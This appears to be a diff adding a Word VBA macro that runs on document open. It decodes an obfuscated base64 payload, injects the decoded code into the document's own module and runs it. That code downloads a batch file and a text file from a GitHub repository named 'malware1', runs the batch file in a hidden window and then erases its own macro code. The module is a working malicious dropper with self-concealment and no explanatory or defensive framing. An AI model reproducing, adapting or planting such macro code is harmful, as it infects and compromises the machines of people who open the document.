@@ -1,0 +1,89 @@
+Sub A()
+End Sub
+Sub B()
+End Sub
+Sub RunDecodedCode()
+    A
+    B
+End Sub
+Private Function DecodeBase64(ByVal base64Str As String) As String
+    Dim objXML As Object, objNode As Object
+    Set objXML = CreateObject("MSXML2.DOMDocument")
+    Set objNode = objXML.createElement("b64")
+    objNode.DataType = "bin.base64"
+    objNode.Text = base64Str
+    DecodeBase64 = StrConv(objNode.nodeTypedValue, vbUnicode)
+End Function
+Sub ExecuteDecodedCode()
+    Dim encodedText As String
+        part1 = "U3ViIEEoKQogICAgRGltIGh0dHAgQXMgT2JqZWN0CiAgICBEaW0gYWRvU3RyZWFtIEFzIE9iamVjdAog" & _
+         "ICAgRGltIGZpbGVVUkwgQXMgVmFyaWFudAogICAgRGltIHNhdmVQYXRoIEFzIFN0cmluZwogICAgRGlt" & _
+         "IHVybHMgQXMgVmFyaWFudAogICAgRGltIHBhdGhzIEFzIFZhcmlhbnQKICAgIERpbSBpIEFzIEludGVn" & _
+         "ZXIKICAgIERpbSBzdGFydFRpbWUgQXMgRG91YmxlCiAgICB1cmxzID0gQXJyYXkoIF8KICAgICJodHRw" & _
+         "czovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbGthN2I2YzczL21hbHdhcmUxL3JlZnMvaGVhZHMv" & _
+         "bWFpbi9jcmVhdGUuYmF0IiwgXwogICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9s" & _
+         "a2E3YjZjNzMvbWFsd2FyZTEvcmVmcy9oZWFkcy9tYWluL2lucHV0LnR4dCIgXwopCiAgICBwYXRocyA9" & _
+         "IEFycmF5KCBfCiAgICAiQzpcVXNlcnNcUHVibGljXERvY3VtZW50c1wiLCBfCiAgICAiQzpcVXNlcnNc" & _
+         "UHVibGljXERvY3VtZW50c1wiIF8KKQogICAgRm9yIGkgPSBMQm91bmQodXJscykgVG8gVUJvdW5kKHVy" & _
+         "bHMpCiAgICAgICAgZmlsZVVSTCA9IHVybHMoaSkKICAgICAgICBzYXZlUGF0aCA9IHBhdGhzKGkpICYg" & _
+         "TWlkKGZpbGVVUkwsIEluU3RyUmV2KGZpbGVVUkwsICIvIikgKyAxKQogICAgICAgIFNldCBodHRwID0g" & _
+         "Q3JlYXRlT2JqZWN0KCJNU1hNTDIuWE1MSFRUUCIpCiAgICAgICAgaHR0cC5PcGVuICJHRVQiLCBmaWxl" & _
+         "VVJMLCBGYWxzZQogICAgICAgIGh0dHAuU2VuZAogICAgICAgIElmIGh0dHAuU3RhdHVzID0gMjAwIFRo" & _
+         "ZW4KICAgICAgICAgICAgU2V0IGFkb1N0cmVhbSA9IENyZWF0ZU9iamVjdCgiQURPREIuU3RyZWFtIikK" & _
+         "ICAgICAgICAgICAgYWRvU3RyZWFtLlR5cGUgPSAxICcgYmluYXJ5CiAgICAgICAgICAgIGFkb1N0cmVh" & _
+         "bS5PcGVuCiAgICAgICAgICAgIGFkb1N0cmVhbS5Xcml0ZSBodHRwLnJlc3BvbnNlQm9keQogICAgICAg" & _
+         "ICAgICBhZG9TdHJlYW0uU2F2ZVRvRmlsZSBzYXZlUGF0aCwgMiAnIE92ZXJ3cml0ZQogICAgICAgICAg" & _
+         "ICBhZG9TdHJlYW0uQ2xvc2UKICAgICAgICBFbHNlCiAgICAgICAgICAgIE1zZ0JveCAiRXJyb3IgREw6" & _
+         "ICIgJiBmaWxlVVJMICYgdmJDckxmICYgIlN0YXR1czogIiAmIGh0dHAuU3RhdHVzLCB2YkV4Y2xhbWF0" & _
+         "aW9uCiAgICAgICAgRW5kIElmCiAgICAgICAgRG8gV2hpbGUgRGlyKHNhdmVQYXRoKSA9ICIiCiAgICAg"
+    part2 = "ICAgICAgIHN0YXJ0VGltZSA9IFRpbWVyCiAgICAgICAgICAgIERvIFdoaWxlIFRpbWVyIDwgc3RhcnRU" & _
+         "aW1lICsgMQogICAgICAgICAgICAgICAgRG9FdmVudHMKICAgICAgICAgICAgTG9vcAogICAgICAgIExv" & _
+         "b3AKICAgICAgICBTZXQgYWRvU3RyZWFtID0gTm90aGluZwogICAgICAgIFNldCBodHRwID0gTm90aGlu" & _
+         "ZwogICAgTmV4dCBpCkVuZCBTdWIKClN1YiBCKCkKICAgIERpbSBjcmVhdGVCYXRQYXRoIEFzIFN0cmlu" & _
+         "ZwogICAgRGltIHN0YXJ0VGltZSBBcyBEb3VibGUKICAgIGNyZWF0ZUJhdFBhdGggPSAiQzpcVXNlcnNc" & _
+         "UHVibGljXERvY3VtZW50c1xjcmVhdGUuYmF0IgogICAgRG8gV2hpbGUgRGlyKGNyZWF0ZUJhdFBhdGgp" & _
+         "ID0gIiIKICAgICAgICBzdGFydFRpbWUgPSBUaW1lcgogICAgICAgIERvIFdoaWxlIFRpbWVyIDwgc3Rh" & _
+         "cnRUaW1lICsgMQogICAgICAgICAgICBEb0V2ZW50cwogICAgICAgIExvb3AKICAgIExvb3AKICAgIFNo" & _
+         "ZWxsIGNyZWF0ZUJhdFBhdGgsIHZiSGlkZQogICAgTXNnQm94ICJEb25lIgogICAgU2V0IHZiQ29tcCA9" & _
+         "IFRoaXNEb2N1bWVudC5WQlByb2plY3QuVkJDb21wb25lbnRzKCJUaGlzRG9jdW1lbnQiKQogICAgRGlt" & _
+         "IGxpbmVDb3VudCBBcyBMb25nCiAgICBsaW5lQ291bnQgPSB2YkNvbXAuQ29kZU1vZHVsZS5Db3VudE9m" & _
+         "TGluZXMKICAgIHZiQ29tcC5Db2RlTW9kdWxlLkRlbGV0ZUxpbmVzIDEsIGxpbmVDb3VudAogICAgVGhp" & _
+         "c0RvY3VtZW50LlNhdmUKICAgIFRoaXNEb2N1bWVudC5DbG9zZSBTYXZlQ2hhbmdlczo9RmFsc2UKRW5k" & _
+         "IFN1Ygo="
+    encodedText = part1 & part2
+
+    Dim decodedCode As String
+    decodedCode = DecodeBase64(encodedText)
+    Dim vbComp As Object
+    Set vbComp = ThisDocument.VBProject.VBComponents("ThisDocument")
+    Dim lineCount As Long
+    lineCount = vbComp.CodeModule.CountOfLines
+    Dim i As Long
+    Dim startLine As Long
+    For i = 1 To lineCount
+        If InStr(1, vbComp.CodeModule.Lines(i, 1), "Sub A()") > 0 Then
+            startLine = i
+            Do While InStr(1, vbComp.CodeModule.Lines(i, 1), "End Sub") = 0
+                i = i + 1
+            Loop
+            vbComp.CodeModule.DeleteLines startLine, i - startLine + 1
+            Exit For
+        End If
+    Next i
+    For i = 1 To lineCount
+        If InStr(1, vbComp.CodeModule.Lines(i, 1), "Sub B()") > 0 Then
+            startLine = i
+            Do While InStr(1, vbComp.CodeModule.Lines(i, 1), "End Sub") = 0
+                i = i + 1
+            Loop
+            vbComp.CodeModule.DeleteLines startLine, i - startLine + 1
+            Exit For
+        End If
+    Next i
+    vbComp.CodeModule.InsertLines 1, decodedCode 
+End Sub
+Private Sub Document_Open()
+    ExecuteDecodedCode
+    Application.OnTime Now + TimeValue("00:00:02"), "RunDecodedCode"
+End Sub
+    
